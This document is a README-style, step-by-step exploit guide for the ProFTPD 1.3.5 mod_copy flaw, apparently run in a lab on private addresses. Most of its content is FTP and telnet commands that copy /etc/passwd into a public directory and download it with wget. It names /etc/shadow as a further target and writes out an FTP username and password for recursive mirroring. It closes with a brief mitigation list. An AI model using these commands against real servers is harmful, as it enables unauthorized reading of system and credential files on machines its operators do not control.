# Proftpd-1.3.5-Mod_Copy-Exploit

## Proftpd 1.3.5 Mod_Copy Exploit

The ProFTPD 1.3.5 FTP server with the mod_copy module allows an attacker to copy arbitrary files on the system using the FTP SITE CPFR and SITE CPTO commands.

This exploit leverages this feature to copy sensitive files (like /etc/passwd) to a world-readable location within the FTP server.

---

## Vulnerability Overview

ProFTPD 1.3.5 with mod_copy enabled allows:

- SITE CPFR: Specify the source file (copy from)
- SITE CPTO: Specify the destination file (copy to)

An attacker can read sensitive files by copying them to a location that's accessible via FTP or HTTP.

---

## Step 1: Connect to the FTP Server

Connect to the vulnerable FTP server on port 2121:

```
ftp 192.168.1.234 2121
```

---

## Step 2: Check Available SITE Commands

Check what SITE commands are available:

```
ftp> site help
```

Expected output:

```
214-The following SITE commands are recognized (* => 's unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@localhost
```

This confirms that the CPFR and CPTO commands are available for file copy operations.

---

## Step 3: Exploit the File Copy Functionality

Use the site cpfr command to specify the source file you want to copy:

```
ftp> site cpfr /etc/passwd
```

Use the site cpto command to specify the destination path for the copied file:

```
ftp> site cpto /var/ftp/pub/passwd
```

### Explanation

- site cpfr /etc/passwd : The source file to copy is /etc/passwd.
- site cpto /var/ftp/pub/passwd : The destination file path within the FTP-accessible directory /var/ftp/pub/.

The copied file (passwd) is now accessible for download via FTP.

---

## Step 4: Verify the Copied File

Change to the /pub directory:

```
ftp> cd /pub
```

Download the copied file:

```
ftp> get passwd
```

---

## Alternate Access Methods

You can also retrieve the file directly using wget with anonymous FTP access:

```
wget ftp://anonymous@192.168.1.234/pub/passwd
```

---

## Using Telnet to Send SITE Commands

You can perform the same commands using telnet to connect directly to the FTP port:

```
telnet 192.168.1.234 2121
```

After connecting, type:

```
site help
site cpfr /etc/passwd
site cpto /var/ftp/pub/passwd
```

---

## Download All Files Recursively

Use wget to recursively download all files from an FTP server:

```
wget -m ftp://anonymous@192.168.1.234/pub/
```

Or specify credentials if needed:

```
wget -m --no-passive ftp://ftp:qazwsx@192.168.1.32
```

---

## Additional Notes

- Binary Mode: Use binary mode in FTP to ensure files are copied correctly:
```
ftp> binary
```

- Account Permissions: This exploit relies on the FTP user's permissions to write to the target directory.

- Real-World Impact: If /etc/shadow is readable by the FTP server, it could also be copied, leading to serious security risks.

---

## Important Mitigation Steps

- Upgrade to a secure version of ProFTPD (disabling mod_copy).
- Restrict FTP access to trusted hosts and users.
- Use secure protocols (SFTP or FTPS) instead of plain FTP.
